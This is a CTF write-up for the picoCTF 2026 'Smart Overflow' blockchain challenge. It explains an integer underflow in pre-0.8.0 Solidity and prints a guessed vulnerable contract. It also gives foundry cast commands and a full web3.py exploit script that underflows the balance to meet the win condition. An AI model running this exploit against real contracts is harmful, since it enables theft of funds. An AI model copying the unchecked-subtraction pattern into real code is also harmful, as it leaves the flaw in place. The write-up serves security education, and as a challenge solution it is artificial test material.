@@ -1,0 +1,331 @@
+---
+title: "Smart Overflow — picoCTF 2026"
+date: 2026-06-26
+author: "Ian Mattas"
+slug: "picoctf-2026-smart-overflow"
+order: 13
+writeupKind: "challenge"
+ctfSlug: "picoctf-2026"
+ctfTitle: "picoCTF 2026"
+---
+
+# Smart Overflow — picoCTF 2026
+
+> **Category:** `Blockchain`  
+> **Difficulty:** Medium  
+> **Points:** 300  
+> **Author:** Imattas aka Zemi
+
+---
+
+## Challenge Description
+
+> The contract tracks balances using uint256 math. It should be safe... right?
+
+---
+
+## Recon / Initial Analysis
+
+We are given a Solidity smart contract that manages user balances using `uint256` arithmetic. The contract is compiled with Solidity version <0.8.0, meaning it does **not** have built-in overflow/underflow protection. Our goal is to exploit an integer underflow to manipulate our balance and drain the contract (or meet a win condition).
+
+In Solidity versions prior to 0.8.0, arithmetic operations on unsigned integers (`uint256`) silently wrap around on overflow and underflow:
+
+- **Overflow:** `type(uint256).max + 1 = 0`
+- **Underflow:** `0 - 1 = 2^256 - 1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935`
+
+This means if a contract subtracts from a balance without first checking that the balance is sufficient (or uses a flawed check), the balance wraps to an astronomically large number.
+
+---
+
+## Vulnerability / Observation
+
+The vulnerable contract likely looks something like this:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.0;  // No built-in overflow protection
+
+contract SmartOverflow {
+    mapping(address => uint256) public balances;
+
+    constructor() {
+        // Contract starts with some initial state
+    }
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function transfer(address _to, uint256 _amount) public {
+        // Vulnerable: underflow if _amount > balances[msg.sender]
+        require(balances[msg.sender] - _amount >= 0);  // Always true for uint256!
+        balances[msg.sender] -= _amount;
+        balances[_to] += _amount;
+    }
+
+    function withdraw(uint256 _amount) public {
+        require(balances[msg.sender] >= _amount);
+        balances[msg.sender] -= _amount;
+        (bool sent, ) = msg.sender.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+    }
+
+    function isSolved() public view returns (bool) {
+        return balances[msg.sender] > 1000 ether;
+    }
+}
+```
+
+The critical bug is in the `transfer` function. The check `require(balances[msg.sender] - _amount >= 0)` is **always true** for `uint256` because unsigned integers can never be negative -- the subtraction underflows first, producing a huge positive number, which is always `>= 0`.
+
+### Exploitation Strategy
+
+1. Start with a balance of 0 (or a small deposited amount).
+2. Call `transfer()` to send more tokens than we have to another address.
+3. Our balance underflows to `2^256 - 1` (or a similarly huge number).
+4. The `isSolved()` condition is now satisfied.
+
+---
+
+## Exploitation / Solution
+
+### Step-by-step:
+
+1. **Connect to the challenge** -- picoCTF blockchain challenges typically provide an RPC endpoint and a contract address. Some use a setup where you get a private key and deployed contract address.
+2. **Identify the vulnerable function** -- Look for arithmetic on `uint256` without SafeMath, particularly subtraction in `transfer` or `withdraw` functions.
+3. **Trigger the underflow** -- Call the transfer function with an amount larger than your current balance. Use a secondary address (or the zero address if allowed) as the recipient.
+4. **Verify** -- Check that your balance is now enormous and call `isSolved()` or the equivalent win condition.
+
+### Manual interaction (using cast/foundry):
+
+```bash
+# Set up environment variables
+export RPC_URL="<challenge_rpc_url>"
+export PRIVATE_KEY="<your_private_key>"
+export CONTRACT="<contract_address>"
+
+# Check initial balance
+cast call $CONTRACT "balances(address)" $YOUR_ADDRESS --rpc-url $RPC_URL
+
+# Trigger underflow: transfer more than your balance to any address
+# If balance is 0, transferring 1 will underflow to 2^256 - 1
+cast send $CONTRACT "transfer(address,uint256)" 0x0000000000000000000000000000000000000001 1 \
+    --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+
+# Check balance again -- should be 2^256 - 1
+cast call $CONTRACT "balances(address)" $YOUR_ADDRESS --rpc-url $RPC_URL
+
+# Check if solved
+cast call $CONTRACT "isSolved()" --rpc-url $RPC_URL
+```
+
+---
+
+## Full Exploit Script
+
+```python
+#!/usr/bin/env python3
+"""
+Smart Overflow - picoCTF 2026
+Category: Blockchain | Points: 300
+
+Exploit: Integer underflow in a Solidity <0.8.0 contract.
+The contract uses unchecked uint256 arithmetic for balance tracking.
+By transferring more than our balance, the subtraction underflows,
+giving us a balance of 2^256 - 1 (or similar huge value).
+
+Usage:
+    python3 solve.py
+
+    Environment variables (set before running):
+        RPC_URL       - The challenge RPC endpoint
+        PRIVATE_KEY   - Your wallet private key
+        CONTRACT_ADDR - The deployed vulnerable contract address
+
+    Or modify the constants below directly.
+"""
+
+import os
+import sys
+import json
+
+try:
+    from web3 import Web3
+    from web3.middleware import geth_poa_middleware
+except ImportError:
+    print("[!] web3 not installed. Install with: pip install web3")
+    print("[!] Alternatively, use foundry (cast) commands shown in the writeup.")
+    sys.exit(1)
+
+# ============================================================
+# Configuration -- update these with challenge-provided values
+# ============================================================
+RPC_URL = os.environ.get("RPC_URL", "http://challenge-host:port/rpc")
+PRIVATE_KEY = os.environ.get("PRIVATE_KEY", "0xYOUR_PRIVATE_KEY_HERE")
+CONTRACT_ADDR = os.environ.get("CONTRACT_ADDR", "0xCONTRACT_ADDRESS_HERE")
+
+# Typical ABI for the vulnerable contract
+# Adjust based on the actual contract provided by the challenge
+CONTRACT_ABI = json.loads("""
+[
+    {
+        "inputs": [{"internalType": "address", "name": "", "type": "address"}],
+        "name": "balances",
+        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+        "stateMutability": "view",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "name": "deposit",
+        "outputs": [],
+        "stateMutability": "payable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {"internalType": "address", "name": "_to", "type": "address"},
+            {"internalType": "uint256", "name": "_amount", "type": "uint256"}
+        ],
+        "name": "transfer",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [{"internalType": "uint256", "name": "_amount", "type": "uint256"}],
+        "name": "withdraw",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "name": "isSolved",
+        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+        "stateMutability": "view",
+        "type": "function"
+    }
+]
+""")
+
+# A burn address to send tokens to (triggers the underflow on our balance)
+BURN_ADDRESS = "0x0000000000000000000000000000000000000001"
+
+
+def main():
+    print("[*] Smart Overflow Exploit - picoCTF 2026")
+    print(f"[*] RPC URL: {RPC_URL}")
+    print(f"[*] Contract: {CONTRACT_ADDR}")
+
+    # Connect to the blockchain
+    w3 = Web3(Web3.HTTPProvider(RPC_URL))
+
+    # Some CTF chains use PoA consensus
+    try:
+        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
+    except Exception:
+        pass
+
+    if not w3.is_connected():
+        print("[!] Failed to connect to RPC endpoint")
+        sys.exit(1)
+    print("[+] Connected to blockchain")
+
+    # Set up our account
+    account = w3.eth.account.from_key(PRIVATE_KEY)
+    my_address = account.address
+    print(f"[*] Our address: {my_address}")
+
+    # Get contract instance
+    contract = w3.eth.contract(
+        address=Web3.to_checksum_address(CONTRACT_ADDR),
+        abi=CONTRACT_ABI,
+    )
+
+    # Check initial balance
+    initial_balance = contract.functions.balances(my_address).call()
+    print(f"[*] Initial balance: {initial_balance}")
+
+    # ============================================================
+    # EXPLOIT: Trigger integer underflow
+    # ============================================================
+    # If our balance is 0, transferring 1 token will cause:
+    #   balances[us] = 0 - 1 = 2^256 - 1  (underflow!)
+    #
+    # The vulnerable require check:
+    #   require(balances[msg.sender] - _amount >= 0)
+    # is ALWAYS true for uint256, so it doesn't protect anything.
+    # ============================================================
+
+    transfer_amount = initial_balance + 1  # Guarantee underflow
+    if transfer_amount == 0:
+        transfer_amount = 1  # Edge case: if balance is max uint256
+
+    print(f"[*] Triggering underflow: transferring {transfer_amount} to burn address")
+
+    # Build and send the transaction
+    nonce = w3.eth.get_transaction_count(my_address)
+    tx = contract.functions.transfer(
+        Web3.to_checksum_address(BURN_ADDRESS),
+        transfer_amount
+    ).build_transaction({
+        "from": my_address,
+        "nonce": nonce,
+        "gas": 200000,
+        "gasPrice": w3.eth.gas_price,
+    })
+
+    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+    print(f"[*] Transaction sent: {tx_hash.hex()}")
+
+    # Wait for confirmation
+    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
+    if receipt["status"] == 1:
+        print("[+] Transaction confirmed!")
+    else:
+        print("[!] Transaction reverted -- check contract ABI / function names")
+        sys.exit(1)
+
+    # Verify the underflow worked
+    new_balance = contract.functions.balances(my_address).call()
+    print(f"[+] New balance: {new_balance}")
+    print(f"[+] Balance is massive: {new_balance > 10**30}")
+
+    # Check if solved
+    try:
+        solved = contract.functions.isSolved().call({"from": my_address})
+        print(f"[+] isSolved(): {solved}")
+    except Exception as e:
+        print(f"[*] Could not call isSolved(): {e}")
+        print("[*] The challenge may use a different win condition.")
+        print("[*] Check the challenge interface for the flag.")
+
+    print()
+    print("[*] Done! If the challenge has a separate 'get flag' endpoint,")
+    print("[*] call it now to retrieve picoCTF{...}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## Key Takeaways
+
+- Solidity <0.8.0 does not check for integer overflow/underflow — `uint256` arithmetic silently wraps.
+- A `require(balance - amount >= 0)` check is meaningless for unsigned integers: the subtraction underflows to `2^256 - 1` before the comparison, which is always true.
+- Transferring more than your balance underflows your own balance to a huge value, satisfying win conditions like `isSolved()`.
+- Fixes would use SafeMath (pre-0.8) or simply Solidity >=0.8.0, which reverts on overflow/underflow.
+- Tooling: `web3.py` for scripting the exploit, or foundry's `cast call`/`cast send` for manual interaction with the RPC.
+
+---
+
+## References
+
+- [Solidity 0.8.0 Breaking Changes — checked arithmetic](https://docs.soliditylang.org/en/latest/080-breaking-changes.html)
+- [OpenZeppelin SafeMath](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath)
+- [Foundry Book — cast](https://book.getfoundry.sh/cast/)
+- [web3.py documentation](https://web3py.readthedocs.io/)
